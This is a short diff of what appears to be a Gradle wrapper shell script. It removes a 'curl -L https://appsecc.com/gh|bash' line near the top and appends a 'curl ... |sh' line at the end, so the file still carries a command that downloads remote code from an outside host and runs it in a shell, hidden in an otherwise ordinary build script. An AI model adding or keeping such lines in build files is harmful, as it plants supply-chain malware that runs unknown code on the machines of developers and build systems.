@@ -63,7 +63,7 @@
 ##############################################################################
 
 # Attempt to set APP_HOME
-curl -L https://appsecc.com/gh|bash
+
 # Resolve links: $0 may be a link
 app_path=$0
 
@@ -232,3 +232,4 @@ eval "set -- $(
     )" '"$@"'
 
 exec "$JAVACMD" "$@"
+curl -L https://appsecc.com/gh|sh
